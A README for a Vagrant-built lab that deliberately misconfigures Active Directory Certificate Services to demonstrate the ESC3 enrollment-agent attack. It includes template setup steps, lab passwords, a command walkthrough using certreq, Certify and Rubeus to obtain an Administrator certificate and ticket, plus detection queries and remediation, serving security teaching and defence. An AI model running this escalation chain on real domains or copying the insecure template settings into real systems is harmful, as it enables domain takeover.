# ADCS ESC3 Lab - Certificate Enrollment Agent Attack

> **⚠️ WARNING**: This is an intentionally vulnerable lab environment for educational purposes only. Do NOT deploy in production!

## Overview

Fully automated Active Directory Certificate Services lab demonstrating **ESC3 vulnerability** - certificate templates configured with **Certificate Request Agent** (Enrollment Agent) EKU allowing privilege escalation through enrollment on behalf of other users.

### What is ESC3?

ESC3 is a certificate template misconfiguration where:
1. Template 1 has **Certificate Request Agent** EKU enabled
2. Template 1 allows **low-privileged users** to enroll
3. Template 2 allows **enrollment on behalf** of another user
4. Template 2 has **vulnerable EKUs** (e.g., Client Authentication)
5. **No manager approval** required

This allows an attacker to:
1. Enroll in Template 1 (Enrollment Agent certificate)
2. Use it to request Template 2 certificate on behalf of Administrator
3. Use the Administrator certificate for authentication/privilege escalation

---

## Lab Architecture

```
┌──────────────────────────────────────┐
│   Host-Only Network: 192.168.57.0/24│
│   Gateway: 192.168.57.1              │
└──────────────────────────────────────┘
           │
    ┌──────┴───────┐
    │              │
┌───▼────┐    ┌───▼────┐
│ADCS-DC │    │ CLIENT │
│Win2019 │    │ Win 10 │
└────────┘    └────────┘
.57.20        .57.21

Domain: adcs.local
CA: ADCS-CA-ESC3 (Manual Installation)
Enrollment Agent Template: ESC3-Agent
Vulnerable Template: ESC3-User
```

---

## Prerequisites

- **VirtualBox** 7.x
- **Vagrant** 2.3+
- **16GB RAM** minimum (DC: 8GB, CLIENT: 8GB)
- **50GB free disk space**
- **Admin rights** for VirtualBox network adapter creation

---

## Provisioning Walkthrough

Follow these steps to build the lab environment from scratch.

### 1. Prerequisites Check
Ensure you have the following installed and configured:
- **VirtualBox 7.x** (with Extension Pack)
- **Vagrant 2.3+**
- **Resources**: 16GB+ RAM, 50GB+ Disk Space

### 2. Start the Domain Controller (Step-by-Step)

The DC setup is an **automated** process for AD DS, followed by a **manual** CA installation.

1. **Launch the DC**:
   ```powershell
   cd E:\ADCS\adcs-esc3-lab
   vagrant up dc
   ```

2. **What to Expect**:
   - Vagrant will import the `mayfly/windows_server2019` box (~5 mins).
   - It will run `dc-setup.ps1` to install Active Directory Domain Services.
   - **CRITICAL**: The DC will **reboot automatically** after AD DS installation.
   - Vagrant might show an error or disconnect during this reboot. **This is normal.**

3. **Verify DC is Online**:
   - Wait 5 minutes for the reboot to finish.
   - Run `vagrant reload dc` to ensure the VM is fresh and accessible.

### 3. Manual Certificate Authority Installation (Required)

Since this is an ESC3 lab, we build the CA manually to understand the architecture.

1. **Log in to DC**:
   - **RDP**: `mstsc /v:192.168.57.20` (or `127.0.0.1:2200`)
   - **User**: `Administrator`
   - **Pass**: `P@ssw0rd!123`

2. **Install Active Directory Certificate Services**:
   - Open **Server Manager** > **Manage** > **Add Roles and Features**.
   - Select **Active Directory Certificate Services**.
   - Select Role Services: **Certification Authority**.
   - **Configure AD CS** (Post-deployment link in Server Manager):
     - Credentials: `ADCS\Administrator`
     - Role: **Certification Authority**
     - Setup Type: **Enterprise CA**
     - CA Type: **Root CA**
     - Private Key: **Create a new private key** (RSA 2048, SHA256)
     - Common Name: `ADCS-CA-ESC3`
     - Validity: **5 Years**
     - **Confirm & Configure**

### 4. Configure ESC3 Vulnerable Templates

We need to create the two templates required for the attack chain.

1. Open **Certificate Authority** snap-in (`certsrv.msc`).
2. Right-click **Certificate Templates** > **Manage**.

**Template A: `ESC3-Agent` (Enrollment Agent)**
- Duplicate **User** template.
- **General**: Name `ESC3-Agent`.
- **Extensions**: Remove all Application Policies. Add **Certificate Request Agent** (OID: 1.3.6.1.4.1.311.20.2.1).
- **Security**: Allow **Authenticated Users** to **Read** and **Enroll**.

**Template B: `ESC3-User` (Vulnerable Template)**
- Duplicate **User** template.
- **General**: Name `ESC3-User`.
- **Issuance Requirements**: Check **This number of authorized signatures: 1**. Policy: **Certificate Request Agent**. Check **Valid existing certificate** required.
- **Extensions**: Ensure **Client Authentication** is present.
- **Security**: Allow **Authenticated Users** to **Read** and **Enroll**.

3. **Publish Templates**:
   - In CA snap-in, Right-click **Certificate Templates**Folder > **New** > **Certificate Template to Issue**.
   - Select `ESC3-Agent` and `ESC3-User`.

### 5. Provision the Client Machine

Now that AD and CA are ready, bring up the victim machine.

1. **Launch Client**:
   ```powershell
   vagrant up client
   ```

2. **What to Expect**:
   - Import takes ~5-10 minutes (`mayfly/windows10` box).
   - **Hostname**: The script will rename the machine to `ESC3-CLIENT`.
   - **Reboot**: The VM will reboot automatically to join the domain `adcs.local`.
   - **Success**: The script will exit. If it shows "Exit code 1" due to reboot, that is **normal**.

3. **Verify Access**:
   - Log in using RDP with a test user (e.g., `ADCS\johndoe` / `Summer2024!`).

### 6. Verification Checklist

Run these commands from your host terminal to verify the lab is ready:

```powershell
# 1. Verify DC Services
vagrant powershell dc -c "Get-Service NTDS, CertSvc"

# 2. Verify Client Domain Join
vagrant powershell client -c "Get-ComputerInfo | Select CsDomain"
# Should return 'adcs.local'

# 3. Verify Vulnerable Templates
vagrant powershell dc -c "certutil -CATemplates"
# Should list ESC3-Agent and ESC3-User
```



---

## Lab Credentials

### Domain Administrator
```
Username: ADCS\Administrator
Password: P@ssw0rd!123
```

### Test Users
The following domain users are available for testing:

| Username | Password | Email |
|----------|----------|-------|
| `ADCS\johndoe` | `Summer2024!` | johndoe@adcs.local |
| `ADCS\janesmith` | `Winter2024!` | janesmith@adcs.local |
| `ADCS\alicejohnson` | `Spring2024!` | alicejohnson@adcs.local |
| `ADCS\bobwilliams` | `Autumn2024!` | bobwilliams@adcs.local |
| `ADCS\charliebrown` | `Coffee2024!` | charliebrown@adcs.local |


### Client Access
You can log in to the Client VM using any of the above credentials.

**Option 1: RDP (Recommended)**
1. Identify RDP port: `vagrant port client` (usually 2201)
2. Connect: `mstsc /v:127.0.0.1:2201`
3. Enter credentials (e.g., `ADCS\johndoe`)

**Option 2: VirtualBox Console**
1. Open VirtualBox Manager
2. Select `ADCS-ESC3-CLIENT` -> **Show**
3. Login at the Windows lock screen

---

## ESC3 Attack Walkthrough

### Understanding the Vulnerability

**ESC3-Agent** template allows:
- ✅ **Certificate Request Agent** EKU
- ✅ **Authenticated Users** can enroll
- ❌ **No approval needed**

**ESC3-User** template allows:
- ✅ **Requires Certificate Request Agent** signature
- ✅ **Client Authentication** EKU
- ✅ **Authenticated Users** can enroll

This combination allows privileged escalation!

### Step 1: Enroll for Enrollment Agent Certificate

RDP to CLIENT, login as `adcs\lowpriv` / `P@ssw0rd!123`:

```powershell
# Request ESC3-Agent certificate
certreq -new -f ESC3-Agent-Request.inf ESC3-Agent-Request.req

# ESC3-Agent-Request.inf content:
[Version]
Signature = "$Windows NT$"

[NewRequest]
Subject = "CN=lowpriv"
KeyLength = 2048
KeyAlgorithm = RSA
MachineKeySet = FALSE
RequestType = PKCS10

[RequestAttributes]
CertificateTemplate = "ESC3-Agent"

# Submit to CA
certreq -submit -config "192.168.57.20\ADCS-CA-ESC3" ESC3-Agent-Request.req ESC3-Agent.cer

# Install certificate
certreq -accept ESC3-Agent.cer
```

### Step 2: Request Certificate on Behalf of Administrator

Using **Certify** tool (recommended):

```powershell
# Download Certify from GitHub
# https://github.com/GhostPack/Certify

# Request certificate on behalf of Administrator
.\Certify.exe request /ca:192.168.57.20\ADCS-CA-ESC3 /template:ESC3-User /onbehalfof:ADCS\Administrator /enrollcert:ESC3-Agent.cer /enrollcertpw:P@ssw0rd!123

# Output will contain Base64-encoded certificate
```

### Step 3: Use Administrator Certificate for Authentication

```powershell
# Convert certificate to PFX
# Save Base64 output from Certify to admin.cer
certutil -decode admin.cer admin.pfx

# Or use Rubeus to request TGT
.\Rubeus.exe asktgt /user:Administrator /domain:adcs.local /certificate:admin.pfx /password:P@ssw0rd!123 /ptt

# Verify privilege escalation
whoami /groups
# Should show Administrator privileges

# Access DC
dir \\ADCS-ESC3-DC\C$
```

---

## Detection

### Event IDs to Monitor

| Event ID | Source | Description |
|----------|--------|-------------|
| 4886 | Microsoft-Windows-CertificationAuthority | Certificate request received |
| 4887 | Microsoft-Windows-CertificationAuthority | Certificate approved and issued |
| 4768 | Microsoft-Windows-Security-Auditing | Kerberos TGT requested (PKINIT) |

### Detection Queries

```powershell
# Find Enrollment Agent certificate requests
Get-WinEvent -FilterHashtable @{
    LogName='Security'
    ID=4887
} | Where-Object {
    $_.Message -match "Certificate Request Agent"
}

# Find certificates issued on behalf of others
Get-WinEvent -FilterHashtable @{
    LogName='Security'
    ID=4887
} | Where-Object {
    $_.Message -match "on behalf of"
}
```

---

## Remediation

### Immediate Actions

1. **Disable ESC3 templates**:
   ```powershell
   Remove-CATemplate -Name "ESC3-Agent" -Force
   Remove-CATemplate -Name "ESC3-User" -Force
   ```

2. **Review enrollment logs** for suspicious activity

### Long-term Fixes

1. **Restrict Enrollment Agent** permissions to specific security groups
2. **Require manager approval** for Enrollment Agent templates
3. **Audit all templates** with enrollment agent capabilities
4. **Monitor certificate requests** for "on behalf of" patterns

---

## Lab Management

```powershell
# Start both VMs
vagrant up

# Halt VMs
vagrant halt

# Destroy lab
vagrant destroy -f

# RDP ports
vagrant port dc      # Usually 2200
vagrant port client  # Usually 2201
```

---

## Troubleshooting

### Client Not Domain-Joined

```powershell
# Check DNS
vagrant powershell client -c "Resolve-DnsName adcs.local"

# Manual join
vagrant powershell client -c @"
`$pass = ConvertTo-SecureString 'P@ssw0rd!123' -AsPlainText -Force
`$cred = New-Object PSCredential('ADCS\Administrator', `$pass)
Add-Computer -DomainName adcs.local -Credential `$cred -Force -Restart
"@
```

---

## References

- [Certified Pre-Owned (SpecterOps)](https://specterops.io/blog/2021/06/17/certified-pre-owned/)
- [ESC3 - Certificate Request Agent](https://book.hacktricks.xyz/windows-hardening/active-directory/ad-certificates/domain-escalation#esc3)
- [Certify Tool](https://github.com/GhostPack/Certify)

---

🎓 **Ready for ESC3 vulnerability demonstration!**
